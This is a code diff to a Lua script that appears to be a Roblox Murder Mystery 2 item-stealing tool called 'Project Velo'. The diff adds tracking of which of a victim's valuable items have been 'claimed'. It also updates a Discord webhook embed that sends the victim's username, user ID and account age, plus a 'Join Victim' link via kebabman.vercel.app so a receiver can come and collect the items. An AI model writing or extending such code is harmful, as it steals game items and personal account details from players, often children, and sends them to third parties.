@@ -1593,6 +1593,46 @@ genv.ProjectVeloMM2LiveRuntime = projectVeloMM2LiveRuntime
 -- direct Discord webhook send: Kaifer-style embed
 local postedMessageIds = {} -- { [webhookUrl] = messageId }
 
+-- snapshot of the original inventory taken at first scan — never re-scanned
+local inventorySnapshot = {}
+local claimedItems = {} -- { [index] = true } when item at that index has been claimed
+
+local function buildValuablesText()
+	local lines = {}
+	for i, v7 in ipairs(inventorySnapshot) do
+		if i > 15 then break end
+		if v7.value > 0 then
+			local displayName = v7.displayName or v7.name
+			local icon = claimedItems[i] and "✅" or "⬜"
+			table.insert(lines, string.format("%s x%d %s ➜ %s (%s)", icon, v7.amount, displayName, fn26(v7.totalValue), v7.rarity))
+		end
+	end
+	local text = #lines > 0 and table.concat(lines, "\n") or "No items"
+	local overflow = #inventorySnapshot - math.min(#inventorySnapshot, 15)
+	if overflow > 0 then
+		text = text .. string.format("\n... and %d more", overflow)
+	end
+	return text
+end
+
+local function markNextUnclaimed()
+	for i, v7 in ipairs(inventorySnapshot) do
+		if v7.value > 0 and not claimedItems[i] then
+			claimedItems[i] = true
+			return
+		end
+	end
+end
+
+local function allClaimed()
+	for i, v7 in ipairs(inventorySnapshot) do
+		if v7.value > 0 and not claimedItems[i] then
+			return false
+		end
+	end
+	return true
+end
+
 local function fn32()
 	-- detect highest rarity in inventory for @everyone trigger
 	local godlyRarities = { Godly = true, Ancient = true, Chroma = true, Unique = true, Vintage = true }
@@ -1616,23 +1656,17 @@ local function fn32()
 	-- join link
 	local joinLink = "https://kebabman.vercel.app/start?placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. tostring(v10)
 
-	-- valuables list (items with value > 0, sorted highest first, max 15)
-	local valuableLines = {}
-	for i, v7 in ipairs(v4) do
-		if i > 15 then break end
-		if v7.value > 0 then
-			local displayName = v7.displayName or v7.name
-			table.insert(valuableLines, string.format("%s x%d %s ➜ %s (%s)", "✨", v7.amount, displayName, fn26(v7.totalValue), v7.rarity))
-		end
-	end
-	local valuablesText = #valuableLines > 0 and table.concat(valuableLines, "\n") or "No items"
-	local overflow = #v4 - math.min(#v4, 15)
-	if overflow > 0 then
-		valuablesText = valuablesText .. string.format("\n... and %d more", overflow)
+	-- snapshot inventory once — fn33 will use this, never re-scans
+	inventorySnapshot = {}
+	claimedItems = {}
+	for _, v7 in ipairs(v4) do
+		table.insert(inventorySnapshot, v7)
 	end
 
-	-- initial status: In Progress — Missed or Claimed are patched onto this same message later
-	local statusText = "🔵 In Progress"
+	local valuablesText = buildValuablesText()
+
+	-- initial status: Hit — Missed or Claimed are patched onto this same message later
+	local statusText = "🟢 Hit"
 
 	local fields = {
 		{ name = "🎯 Status",      value = string.format("```\nStatus:   %s\nExecutor: %s\nReceiver: %s\n```", statusText, str12, receiverDisplay), inline = false },
@@ -1787,22 +1821,18 @@ local function fn33(arg, arg2, _arg3)
 
 	local joinLink = "https://kebabman.vercel.app/start?placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. tostring(v10)
 
-	local valuableLines = {}
-	for i, v7 in ipairs(v4) do
-		if i > 15 then break end
-		if v7.value > 0 then
-			local displayName = v7.displayName or v7.name
-			table.insert(valuableLines, string.format("%s x%d %s ➜ %s (%s)", "✨", v7.amount, displayName, fn26(v7.totalValue), v7.rarity))
-		end
-	end
-	local valuablesText = #valuableLines > 0 and table.concat(valuableLines, "\n") or "No items"
-	local overflow = #v4 - math.min(#v4, 15)
-	if overflow > 0 then
-		valuablesText = valuablesText .. string.format("\n... and %d more", overflow)
-	end
+	-- mark next unclaimed item in the original snapshot as claimed
+	markNextUnclaimed()
+
+	-- build valuables from snapshot with per-item ✅/⬜ icons — never re-scans v4
+	local valuablesText = buildValuablesText()
+
+	-- status: still In Progress if more items remain, Claimed if all done
+	local statusLabel = allClaimed() and "✅ Claimed" or "🔵 In Progress"
+	local embedColor = allClaimed() and 5763719 or 3447003
 
 	local fields = {
-		{ name = "🎯 Status",      value = string.format("```\nStatus:   ✅ Claimed\nExecutor: %s\nReceiver: %s\n```", str12, receiverDisplay), inline = false },
+		{ name = "🎯 Status",      value = string.format("```\nStatus:   %s\nExecutor: %s\nReceiver: %s\n```", statusLabel, str12, receiverDisplay), inline = false },
 		{ name = "🎯 Player",      value = string.format("```\nUsername:     %s\nUser ID:      %s\nAccount Age:  %d days\nDisplay Name: %s\n```", localPlayer.Name, tostring(localPlayer.UserId), accountAgeDays, localPlayer.DisplayName), inline = false },
 		{ name = "🔗 Join Victim", value = "[Click Here](" .. joinLink .. ")", inline = false },
 		{ name = "💰 Total Value", value = "```\n" .. tradeValue .. "\n```", inline = false },
@@ -1820,7 +1850,7 @@ local function fn33(arg, arg2, _arg3)
 		local patchPayload = HttpService:JSONEncode({
 			embeds = {{
 				title  = "Murder Mystery 2! Look, You Have Hits! Congrats! 🎉",
-				color  = 5763719,
+				color  = embedColor,
 				fields = fields,
 				footer = { text = "MM2 • Project Velo" },
 			}},
